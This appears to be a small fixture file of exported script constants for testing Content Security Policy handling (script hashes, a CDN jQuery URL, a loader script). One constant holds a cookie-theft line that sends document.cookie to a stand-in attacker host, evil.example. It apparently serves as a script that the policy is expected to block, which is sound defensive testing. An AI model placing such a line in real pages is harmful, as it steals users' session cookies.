export const HASH_SCRIPT_CONTENT = `markScriptRan();`;
export const DIFFERENT_SCRIPT_CONTENT = `fetch('https://evil.example/steal?c=' + document.cookie)`;

export const CDN_ORIGIN = 'https://cdnjs.cloudflare.com';
export const CDN_SCRIPT_URL = `${CDN_ORIGIN}/ajax/libs/jquery/3.7.1/jquery.min.js`;

export const LOADER_SCRIPT = `var s = document.createElement('script');
s.src = '/lab-assets/scripts/sdk.js';
document.head.appendChild(s);
`;
